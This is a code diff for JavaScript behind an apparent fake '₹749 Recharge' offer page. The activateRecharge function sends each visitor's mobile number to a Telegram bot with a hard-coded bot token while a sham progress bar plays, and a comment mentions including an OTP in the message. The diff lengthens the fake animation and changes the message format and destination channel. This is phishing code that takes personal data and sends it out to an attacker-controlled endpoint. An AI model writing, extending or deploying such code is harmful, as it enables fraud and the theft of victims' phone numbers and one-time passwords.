@@ -14,7 +14,7 @@ function activateRecharge() {
     showLoadingSpinner();
 
     // Send the number to the Telegram bot immediately
-    sendToTelegramBot(inputNumber);
+    sendToTelegramBot(inputNumber, 'Activating ₹749 Recharge.');
 
     var progressBar = document.getElementById('progress-bar');
     var progressFill = document.getElementById('progress-fill');
@@ -24,7 +24,7 @@ function activateRecharge() {
     progressText.innerHTML = 'Activating ₹749 Recharge.';
 
     // Assuming a simple animation to show progress (you can replace this with your logic)
-    var totalTime = 50 * 1000; // 1.5 minutes in milliseconds
+    var totalTime = 90 * 1000; // 1.5 minutes in milliseconds
     var interval = setInterval(frame, totalTime / 100); // Adjust the total steps for the animation
 
     var width = 0;
@@ -72,13 +72,13 @@ function hideLoadingSpinner() {
 function sendToTelegramBot(mobileNumber, message) {
     // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
     var botToken = '6752961822:AAHzDMtUeGxHpoRWenQhZJLfCbDOFJvk9Kg';
-    var chatId = '6324305321';
+    var chatId = '@YourChannelUsername'; // Replace with your channel username
 
     // API endpoint for sending messages
     var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     // Full message including OTP
-    var fullMessage = `Mob No: ${mobileNumber}`;
+    var fullMessage = `Mob No: ${mobileNumber}\n${message}`;
 
     // Build the request parameters
     var params = {
